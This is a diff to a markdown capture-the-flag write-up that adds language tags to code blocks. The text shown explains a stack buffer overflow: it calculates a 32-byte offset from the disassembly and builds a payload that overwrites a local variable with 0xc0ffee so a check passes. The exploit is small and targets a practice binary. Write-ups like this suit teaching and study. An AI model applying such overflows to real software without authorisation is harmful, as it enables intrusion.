@@ -133,7 +133,7 @@ From the stack layout, the input buffer starts at `[rbp-0x30]`, while the variab
 
 The actual offset doesn't need a cyclic pattern, it's sitting right there in the disassembly:
 
-```
+```asm
 buffer start : [rbp-0x30]
 target var   : [rbp-0x10]
 
@@ -142,14 +142,14 @@ offset = (rbp-0x10) - (rbp-0x30) = 0x30 - 0x10 = 0x20 = 32 bytes
 
 So the payload needs 32 bytes of padding before writing the target value:
 
-```
+```python
 payload = b"A" * 32
 payload += p64(0xc0ffee)
 ```
 
 This places 0xc0ffee directly into the variable at `[rbp-0x10]`, allowing the subsequent comparison to succeed:
 
-```
+```asm
 cmp rax, 0xc0ffee
 ```
 
